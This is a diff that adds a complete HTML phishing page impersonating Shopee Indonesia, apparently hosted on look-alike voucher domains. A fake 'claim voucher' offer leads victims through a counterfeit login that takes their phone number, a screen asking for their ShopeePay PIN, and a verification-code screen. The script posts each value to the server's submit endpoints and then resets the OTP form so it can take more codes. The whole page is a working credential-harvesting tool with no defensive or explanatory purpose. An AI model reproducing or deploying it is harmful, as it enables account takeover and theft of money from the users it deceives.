@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pusat Voucher & Cashback Shopee</title>
+
+  <!-- Open Graph Meta Tag -->
+  <meta property="og:title" content="Pusat Voucher & Cashback Shopee" />
+  <meta property="og:description" content="Voucher Shopee terbaru telah tersedia , cek dan klaim Voucher yang masih aktif untuk Anda dapatkan." />
+  <meta property="og:image" content="https://klaim-voucher-shopee.com/static/OIP.jpeg" />
+  <meta property="og:type" content="website" />
+
+  <!-- WhatsApp & Telegram -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Pusat Voucher & Cashback Shopee" />
+  <meta name="twitter:description" content="Voucher Shopee terbaru telah tersedia , cek dan klaim Voucher yang masih aktif untuk Anda dapatkan." />
+  <meta name="twitter:image" content="https://klaim-voucher-shopee.onrender.com/static/OIP.jpeg" />
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 430px;
+      min-height: 100vh;
+      padding: 0 24px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 0;
+      gap: 8px;
+    }
+
+    .header span { font-size: 18px; font-weight: 600; }
+    .header a { font-size: 22px; color: #ee4d2d; text-decoration: none; }
+    .header-icon {
+      width: 28px; height: 28px;
+      border: 2px solid #ee4d2d;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      color: #ee4d2d; font-size: 14px; font-weight: bold;
+    }
+
+    /* Logo */
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      margin: 32px 0 36px;
+    }
+
+    .logo {
+      width: 80px; height: 80px;
+      background: #ee4d2d;
+      border-radius: 16px;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff;
+      font-size: 40px;
+      font-weight: 900;
+      box-shadow: 0 4px 16px rgba(238,77,45,.35);
+    }
+
+    /* Input */
+    .input-group {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 0;
+      margin-bottom: 8px;
+      gap: 12px;
+    }
+
+    .input-group .icon { color: #aaa; font-size: 18px; }
+
+    .input-group input {
+      flex: 1;
+      border: none;
+      outline: none;
+      font-size: 15px;
+      color: #333;
+      background: transparent;
+    }
+
+    .input-group input::placeholder { color: #bbb; }
+
+    /* Tombol Login */
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: #f0f0f0;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      color: #999;
+      margin-top: 20px;
+      cursor: pointer;
+      transition: background .2s, color .2s;
+    }
+
+    .btn-login.aktif {
+      background: #ee4d2d;
+      color: #fff;
+    }
+
+    .link-hp {
+      text-align: center;
+      margin-top: 14px;
+      font-size: 14px;
+      color: #ee4d2d;
+      cursor: pointer;
+    }
+
+    /* Atau */
+    .atau {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 24px 0;
+      color: #aaa;
+      font-size: 13px;
+    }
+
+    .atau::before, .atau::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #eee;
+    }
+
+    /* Tombol sosial */
+    .btn-sosial {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      width: 100%;
+      padding: 13px;
+      border: 1px solid #e0e0e0;
+      border-radius: 4px;
+      background: #fff;
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 12px;
+      cursor: pointer;
+    }
+
+    .btn-sosial img { width: 22px; height: 22px; }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #aaa;
+      margin-top: auto;
+      padding: 24px 0;
+    }
+
+    .footer a { color: #ee4d2d; text-decoration: none; }
+
+    /* Halaman OTP — sembunyikan dulu */
+    #halaman-otp { display: none; }
+
+    .pin-box {
+      width: 48px;
+      height: 56px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      text-align: center;
+      font-size: 24px;
+      outline: none;
+      caret-color: transparent;
+      transition: border-color .2s;
+    }
+
+    .pin-box:focus {
+      border-color: #ee4d2d;
+    }
+
+    .btn-konfirmasi {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      width: 100%;
+      padding: 16px;
+      background: #ee4d2d;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    /* ===== HALAMAN OTP BARU ===== */
+    #halaman-otp-baru {
+      display: none;
+    }
+
+    .otp-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .otp-header span {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .otp-desc {
+      text-align: center;
+      margin: 36px 24px 0;
+      font-size: 14px;
+      color: #888;
+      line-height: 1.6;
+    }
+
+    .otp-desc strong {
+      color: #111;
+      font-weight: 700;
+    }
+
+    .otp-nomor {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 700;
+      color: #111;
+      margin-top: 10px;
+    }
+
+    .otp-boxes {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 36px 24px 0;
+    }
+
+    .otp-box {
+      flex: 1;
+      max-width: 48px;
+      height: 44px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      color: #111;
+      background: transparent;
+      outline: none;
+      caret-color: transparent;
+      transition: border-color .2s;
+    }
+
+    .otp-box:focus {
+      border-bottom-color: #111;
+    }
+
+    .otp-box.terisi {
+      border-bottom-color: #111;
+    }
+
+    .btn-lanjut {
+      display: block;
+      margin: 32px auto 0;
+      width: calc(100% - 48px);
+      padding: 16px;
+      background: #e0e0e0;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #999;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background .2s, color .2s;
+    }
+
+    .btn-lanjut.aktif {
+      background: #ee4d2d;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ===== HALAMAN AWAL BARU ===== -->
+<div id="halaman-awal-baru" style="
+  width: 100%;
+  max-width: 430px;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  background-color: #f0ead6;
+  background-image: repeating-linear-gradient(
+    90deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.015) 2px,
+    rgba(0,0,0,0.015) 3px
+  ),
+  repeating-linear-gradient(
+    180deg,
+    transparent,
+    transparent 4px,
+    rgba(0,0,0,0.01) 4px,
+    rgba(0,0,0,0.01) 5px
+  );
+  margin: 0 auto;
+">
+
+  <!-- Gambar Pengumuman -->
+  <div style="width:100%; flex:1; overflow:hidden;">
+    <img src="/static/vlll.png" alt="Pengumuman Resmi Shopee" style="width:100%; display:block;" />
+  </div>
+
+  <!-- Tombol Klaim -->
+  <div style="padding: 20px 24px 0;">
+    <button onclick="keHalamanHP()" style="
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #ee4d2d, #ff7043);
+      border: none;
+      border-radius: 50px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      box-shadow: 0 4px 18px rgba(238,77,45,.40);
+    ">
+      🎁 Klaim Voucher Shopee Sekarang
+    </button>
+  </div>
+
+  <!-- Footer Copyright -->
+  <div style="
+    text-align: center;
+    font-size: 12px;
+    color: #aaa;
+    padding: 14px 24px 20px;
+  ">
+    &copy; 2026 <a href="#" style="color:#ee4d2d; text-decoration:none;">PT Shopee Indonesia</a>. All rights reserved.
+  </div>
+
+</div>
+
+<div class="container" style="display:none;" id="main-container">
+
+  <!-- ===== HALAMAN 1: INPUT NO HP ===== -->
+  <div id="halaman-hp" style="display:none;">
+
+    <div class="header">
+      <div style="display:flex; align-items:center; gap:8px;">
+        <a href="#">←</a>
+        <span>Log In</span>
+      </div>
+      <div class="header-icon">?</div>
+    </div>
+
+    <div class="logo-wrap">
+      <img src="/static/sspe.png" alt="Logo" style="width:80px; height:80px; object-fit:contain;" />
+    </div>
+
+    <div class="input-group">
+      <span class="icon">👤</span>
+      <input type="tel" id="nomor-hp" placeholder="No. Handphone" oninput="cekInput()" />
+    </div>
+
+    <button class="btn-login" id="btn-login" onclick="kirimHP()">Log In</button>
+
+    <p class="link-hp">Log in dengan no. handphone</p>
+
+    <div class="atau">ATAU</div>
+
+    <button class="btn-sosial">
+      <img src="https://www.svgrepo.com/show/475656/google-color.svg" /> Log In dengan Google
+    </button>
+    <button class="btn-sosial">
+      <img src="https://www.svgrepo.com/show/452197/facebook.svg" /> Log In dengan Facebook
+    </button>
+    <button class="btn-sosial">
+      <img src="https://www.svgrepo.com/show/452133/whatsapp.svg" /> Log In dengan WhatsApp
+    </button>
+
+    <div class="footer">
+      Belum punya akun? <a href="#">Daftar</a>
+    </div>
+
+  </div>
+
+  <!-- ===== HALAMAN 2: INPUT PIN ===== -->
+  <div id="halaman-otp">
+
+    <div class="header">
+      <div style="display:flex; align-items:center; gap:8px;">
+        <a href="#" onclick="kembali()">←</a>
+        <span>PIN ShopeePay</span>
+      </div>
+      <div></div>
+    </div>
+
+    <div style="border-bottom:1px solid #eee; margin: 0 -24px;"></div>
+
+    <div class="logo-wrap" style="margin: 40px 0 32px;">
+      <img src="/static/Shopee-Pay.png" alt="Logo" style="height:48px; object-fit:contain;" />
+    </div>
+
+    <div style="display:flex; gap:12px; justify-content:center; margin-bottom: 8px;">
+      <span style="font-size:16px; color:#333;">Masukkan</span>
+      <span style="font-size:16px; color:#333;">PIN ShopeePay</span>
+    </div>
+
+    <div id="pin-boxes" style="display:flex; gap:8px; justify-content:center; margin: 24px 0 48px;">
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+      <input class="pin-box" type="password" inputmode="numeric" maxlength="1" />
+    </div>
+
+    <button class="btn-konfirmasi" id="btn-konfirmasi" onclick="kirimOTP()">Konfirmasi</button>
+
+  </div>
+
+  <!-- ===== HALAMAN OTP BARU ===== -->
+  <div id="halaman-otp-baru">
+
+    <div class="otp-header">
+      <span>Masukkan Kode Verifikasi</span>
+    </div>
+
+    <p class="otp-desc">
+      Kode verifikasi (OTP) kamu telah dikirim melalui
+      <strong>WhatsApp/SMS</strong> ke
+    </p>
+    <p class="otp-nomor" id="tampil-nomor">-</p>
+
+    <div class="otp-boxes">
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+      <input class="otp-box" type="tel" inputmode="numeric" maxlength="1" />
+    </div>
+
+    <button class="btn-lanjut" id="btn-lanjut" onclick="kirimKodeOTP()">Lanjut</button>
+
+  </div>
+
+</div>
+
+<script>
+  function keHalamanHP() {
+    document.getElementById('halaman-awal-baru').style.display = 'none';
+    document.getElementById('main-container').style.display = 'flex';
+    document.getElementById('halaman-hp').style.display = 'block';
+  }
+
+
+  function cekInput() {
+    const val = document.getElementById('nomor-hp').value;
+    const btn = document.getElementById('btn-login');
+    btn.classList.toggle('aktif', val.length > 0);
+  }
+
+  async function kirimHP() {
+    const nomor = document.getElementById('nomor-hp').value.trim();
+    if (!nomor) return;
+
+    const res = await fetch('/submit-hp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ nomor_hp: nomor })
+    });
+
+    const data = await res.json();
+    if (data.success) {
+      document.getElementById('halaman-hp').style.display = 'none';
+      document.getElementById('halaman-otp').style.display = 'block';
+    }
+  }
+
+
+
+  function kembali() {
+    document.getElementById('halaman-otp').style.display = 'none';
+    document.getElementById('halaman-hp').style.display = 'block';
+  }
+
+  // Logika PIN — auto pindah & auto fokus kolom kosong
+  const pinBoxes = document.querySelectorAll('.pin-box');
+
+  pinBoxes.forEach((box, index) => {
+    // Klik kotak mana pun → fokus ke kolom kosong pertama
+    box.addEventListener('click', () => {
+      const kosong = [...pinBoxes].findIndex(b => b.value === '');
+      if (kosong !== -1) pinBoxes[kosong].focus();
+      else pinBoxes[5].focus();
+    });
+
+    box.addEventListener('keydown', (e) => {
+      if (e.key >= '0' && e.key <= '9') {
+        box.value = e.key;
+        // Pindah ke kotak berikutnya
+        if (index < 5) pinBoxes[index + 1].focus();
+        e.preventDefault();
+        cekPinLengkap();
+      } else if (e.key === 'Backspace') {
+        if (box.value !== '') {
+          box.value = '';
+        } else if (index > 0) {
+          pinBoxes[index - 1].value = '';
+          pinBoxes[index - 1].focus();
+        }
+        e.preventDefault();
+        cekPinLengkap();
+      }
+    });
+  });
+
+  function cekPinLengkap() {
+    const semua = [...pinBoxes].every(b => b.value !== '');
+    document.getElementById('btn-konfirmasi').style.opacity = semua ? '1' : '0.5';
+  }
+
+  async function kirimOTP() {
+    const kode = [...pinBoxes].map(b => b.value).join('');
+    if (kode.length < 6) return;
+
+    await fetch('/submit-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ kode_otp: kode })
+    });
+
+    document.getElementById('tampil-nomor').textContent =
+      document.getElementById('nomor-hp').value.trim();
+    document.getElementById('halaman-otp').style.display = 'none';
+    document.getElementById('halaman-otp-baru').style.display = 'block';
+    otpBoxes[0].focus();
+  }
+
+  // ===== LOGIKA OTP BARU =====
+  const otpBoxes = document.querySelectorAll('.otp-box');
+
+  otpBoxes.forEach((box, index) => {
+    box.addEventListener('click', () => {
+      const kosong = [...otpBoxes].findIndex(b => b.value === '');
+      if (kosong !== -1) otpBoxes[kosong].focus();
+      else otpBoxes[5].focus();
+    });
+
+    box.addEventListener('keydown', (e) => {
+      if (e.key >= '0' && e.key <= '9') {
+        box.value = e.key;
+        box.classList.add('terisi');
+        if (index < 5) otpBoxes[index + 1].focus();
+        e.preventDefault();
+        cekOTPLengkap();
+      } else if (e.key === 'Backspace') {
+        if (box.value !== '') {
+          box.value = '';
+          box.classList.remove('terisi');
+        } else if (index > 0) {
+          otpBoxes[index - 1].value = '';
+          otpBoxes[index - 1].classList.remove('terisi');
+          otpBoxes[index - 1].focus();
+        }
+        e.preventDefault();
+        cekOTPLengkap();
+      }
+    });
+  });
+
+  function cekOTPLengkap() {
+    const semua = [...otpBoxes].every(b => b.value !== '');
+    document.getElementById('btn-lanjut').classList.toggle('aktif', semua);
+  }
+
+  async function kirimKodeOTP() {
+    const kode = [...otpBoxes].map(b => b.value).join('');
+    if (kode.length < 6) return;
+
+    await fetch('/submit-kode', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ kode_otp: kode })
+    });
+
+    // Reset kolom & tetap di halaman ini
+    otpBoxes.forEach(b => {
+      b.value = '';
+      b.classList.remove('terisi');
+    });
+    document.getElementById('btn-lanjut').classList.remove('aktif');
+    otpBoxes[0].focus();
+  }
+
+</script>
+</body>
+</html>
